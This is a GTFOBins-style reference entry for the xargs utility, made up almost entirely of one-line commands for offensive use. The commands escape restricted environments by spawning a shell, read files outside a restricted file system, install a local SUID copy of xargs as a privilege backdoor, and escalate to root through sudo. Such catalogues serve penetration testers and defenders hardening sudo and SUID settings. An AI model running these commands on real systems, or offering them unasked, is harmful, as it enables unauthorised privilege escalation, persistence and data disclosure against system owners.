# GTFOBin: xargs

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

GNU version only.

```
xargs -a /dev/null sh
```

```
echo x | xargs -Iy sh -c 'exec sh 0<&1'
```

Read interactively from `stdin`.

```
xargs -Ix sh -c 'exec sh 0<&1'
x^D^D
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

This works as long as the file does not contain the NUL character, also a trailing `$'\n'` is added. The actual `/bin/echo` command is executed. GNU version only.

```
LFILE=file_to_read
xargs -a "$LFILE" -0
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

GNU version only.

```
sudo install -m =xs $(which xargs) .

./xargs -a /dev/null sh -p
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

GNU version only.

```
sudo xargs -a /dev/null sh
```